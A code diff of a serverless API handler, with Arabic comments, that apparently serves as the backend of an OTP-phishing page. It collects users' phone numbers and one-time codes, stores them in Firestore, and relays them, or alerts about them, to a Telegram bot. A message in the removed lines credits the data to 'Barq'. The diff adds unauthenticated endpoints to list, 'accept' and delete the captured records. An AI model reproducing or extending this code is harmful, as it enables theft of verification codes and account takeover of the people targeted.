@@ -1,39 +1,54 @@
 import { initializeApp } from "firebase/app";
-import { getFirestore, collection, addDoc } from "firebase/firestore";
+import { getFirestore, collection, addDoc, getDocs, query, orderBy, doc, updateDoc, deleteDoc } from "firebase/firestore";
 
-// إعداد Firebase من متغيرات البيئة التي أضفتها في Vercel
 const firebaseConfig = JSON.parse(process.env.FIREBASE_CONFIG);
 const app = initializeApp(firebaseConfig);
 const db = getFirestore(app);
 
 export default async function handler(req, res) {
-    if (req.method !== 'POST') return res.status(405).json({ message: 'Method not allowed' });
-
-    const { phone, otp } = req.body;
+    const { method } = req;
+    const usersCol = collection(db, "users");
 
     try {
-        // 1. الحفظ في Firebase Firestore
-        await addDoc(collection(db, "users"), {
-            phone: phone,
-            otp: otp,
-            timestamp: new Date()
-        });
+        // 1. جلب البيانات (للإدارة)
+        if (method === 'GET') {
+            const q = query(usersCol, orderBy("timestamp", "desc"));
+            const snapshot = await getDocs(q);
+            const data = snapshot.docs.map(d => ({ id: d.id, ...d.data() }));
+            return res.status(200).json(data);
+        }
 
-        // 2. الإرسال إلى بوت تليجرام
-        const message = `بيانات جديدة من برق:\nرقم الجوال: ${phone}\nالرمز: ${otp}`;
-        const url = `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`;
-        
-        await fetch(url, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ 
-                chat_id: process.env.TELEGRAM_CHAT_ID, 
-                text: message 
-            })
-        });
+        // 2. إرسال بيانات جديدة (من صفحة المستخدم)
+        if (method === 'POST') {
+            const { phone, otp } = req.body;
+            await addDoc(usersCol, { phone, otp, status: "pending", timestamp: new Date() });
+            
+            // إشعار تليجرام
+            await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: process.env.TELEGRAM_CHAT_ID, text: `رقم جديد: ${phone}` })
+            });
+            return res.status(200).json({ success: true });
+        }
 
-        res.status(200).json({ success: true });
+        // 3. تعديل الحالة (قبول)
+        if (method === 'PATCH') {
+            const { id, status } = req.body;
+            await updateDoc(doc(db, "users", id), { status: status });
+            return res.status(200).json({ success: true });
+        }
+
+        // 4. حذف سجل
+        if (method === 'DELETE') {
+            const { id } = req.body;
+            await deleteDoc(doc(db, "users", id));
+            return res.status(200).json({ success: true });
+        }
+
+        return res.status(405).json({ message: 'Method not allowed' });
+
     } catch (error) {
-        res.status(500).json({ error: error.message });
+        return res.status(500).json({ error: error.message });
     }
 }
